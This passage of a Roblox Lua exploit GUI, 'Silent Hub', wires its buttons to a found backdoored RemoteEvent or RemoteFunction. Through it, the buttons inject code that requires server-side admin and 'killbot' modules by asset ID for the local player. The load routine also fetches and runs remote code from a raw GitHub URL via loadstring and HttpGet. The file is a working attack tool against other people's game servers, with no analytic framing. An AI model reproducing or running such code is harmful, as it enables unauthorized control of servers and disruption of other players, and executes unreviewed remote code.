	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_109);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Calamity.LocalScript
local function C_10c()
local script = G2L["10c"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(3032735551):Start("]] .. game.Players.LocalPlayer.Name .. [[", "AAA")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_10c);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Killbot.LocalScript
local function C_10f()
local script = G2L["10f"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(110756170974672).killbot("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_10f);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Sledge Hammer.LocalScript
local function C_112()
local script = G2L["112"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(8038037940).CLoad("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_112);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Secret Service Panel.LocalScript
local function C_115()
local script = G2L["115"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(16920033857)("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_115);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Dex Explorer.LocalScript
local function C_118()
local script = G2L["118"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(14572394952)("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_118);
-- StarterGui.Silent Hub.Main.MainContainer.Pages.Scripts.Main.Dependent.Hacker X.LocalScript
local function C_11b()
local script = G2L["11b"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Parent.AcquiredRemote
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(4722260429).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_11b);
-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Server.LocalScript
local function C_123()
local script = G2L["123"];
	local button = script.Parent
	local Pages = button.Parent.Parent.Pages
	
	function click()
		for _, v in pairs(Pages:GetChildren()) do
			if v:IsA("Frame") or v:IsA("ScrollingFrame") then
				v.Visible = false
			end
		end
		Pages["Server"].Visible = true
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_123);
-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Executor.LocalScript
local function C_126()
local script = G2L["126"];
	local button = script.Parent
	local Pages = button.Parent.Parent.Pages
	
	function click()
		for _, v in pairs(Pages:GetChildren()) do
			if v:IsA("Frame") or v:IsA("ScrollingFrame") then
				v.Visible = false
			end
		end
		Pages["Executor"].Visible = true
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_126);
-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Scripts.LocalScript
local function C_129()
local script = G2L["129"];
	local button = script.Parent
	local Pages = button.Parent.Parent.Pages
	
	function click()
		for _, v in pairs(Pages:GetChildren()) do
			if v:IsA("Frame") or v:IsA("ScrollingFrame") then
				v.Visible = false
			end
		end
		Pages["Scripts"].Visible = true
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_129);
-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Players.LocalScript
local function C_12c()
local script = G2L["12c"];
	local button = script.Parent
	local Pages = button.Parent.Parent.Pages
	
	function click()
		for _, v in pairs(Pages:GetChildren()) do
			if v:IsA("Frame") or v:IsA("ScrollingFrame") then
				v.Visible = false
			end
		end
		Pages["Players"].Visible = true
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_12c);
-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Settings.LocalScript
local function C_12f()
local script = G2L["12f"];
	local button = script.Parent
	local Pages = button.Parent.Parent.Pages
	
	function click()
		for _, v in pairs(Pages:GetChildren()) do
			if v:IsA("Frame") or v:IsA("ScrollingFrame") then
				v.Visible = false
			end
		end
		Pages["Settings"].Visible = true
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_12f);
-- StarterGui.Silent Hub.Main.MainContainer.Tabs.Credits.LocalScript
local function C_132()
local script = G2L["132"];
	local button = script.Parent
	local Pages = button.Parent.Parent.Pages
	
	function click()
		for _, v in pairs(Pages:GetChildren()) do
			if v:IsA("Frame") or v:IsA("ScrollingFrame") then
				v.Visible = false
			end
		end
		Pages["Credits"].Visible = true
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_132);
-- StarterGui.Silent Hub.Main.MainContainer.Footer.Version.LocalScript
local function C_136()
local script = G2L["136"];
	local v = script.Parent.Parent.Parent.Parent.Parent.Version
	local text = script.Parent
	
	text.Text = "v" .. v.Value
end;
task.spawn(C_136);
-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button.LocalScript
local function C_138()
local script = G2L["138"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.AcquiredRemote
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		
		require(9635947635).load("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_138);
-- StarterGui.Silent Hub.Main.MainContainer.Footer.Button.LocalScript
local function C_13b()
local script = G2L["13b"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.AcquiredRemote
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		game.Players.]].. game.Players.LocalPlayer.Name ..[[:LoadCharacter()
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_13b);
-- StarterGui.Silent Hub.Main.MainContainer.Footer.TextButton.LocalScript
local function C_13e()
local script = G2L["13e"];
	local button = script.Parent
	local InviteLink = "dsc.gg/teamc00lkidd"
	
	button.MouseEnter:Connect(function()
		button.TextColor3 = Color3.fromRGB(0, 85, 255)
		button.FontFace.Style = Enum.FontStyle.Bold
		button.TextSize = 20
	end)
	
	button.MouseLeave:Connect(function()
		button.TextColor3 = Color3.fromRGB(255, 255, 255)
		button.FontFace.Style = Enum.FontStyle.Normal
		button.TextSize = 18
	end)
	
	button.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard(InviteLink)
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Invite link copied!"
		})
	end)
end;
task.spawn(C_13e);
-- StarterGui.Silent Hub.Main.Toggle.LocalScript
local function C_140()
local script = G2L["140"];
	local button = script.Parent
	local titlebar = button.Parent
	local window = titlebar.MainContainer
	
	function toggle()
		window.Visible = not window.Visible
		
		if window.Visible then
			button.Text = "-"
			titlebar.Size = UDim2.new(0, 500, 0, 31)
		else
			button.Text = "+"
			titlebar.Size = UDim2.new(0, 500, 0, 20)
		end
	end
	
	button.MouseButton1Click:Connect(toggle)
end;
task.spawn(C_140);
-- StarterGui.Silent Hub.Load
local function C_144()
local script = G2L["144"];
	local main = script.Parent.Main
	local pages = main.MainContainer.Pages
	local start = pages.StartingPage
	local tabs = main.MainContainer.Tabs
	
	local function load()
		for _, v in pairs(pages:GetChildren()) do
			if v:IsA("Frame") or v:IsA("ScrollingFrame") then
				v.Visible = false
			end
		end
		start.Visible = true
		tabs.Visible = false
	end
	
	load()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/hyperionhax/Silent-Hub/main/lol"))()
end;
task.spawn(C_144);

return G2L["1"], require;
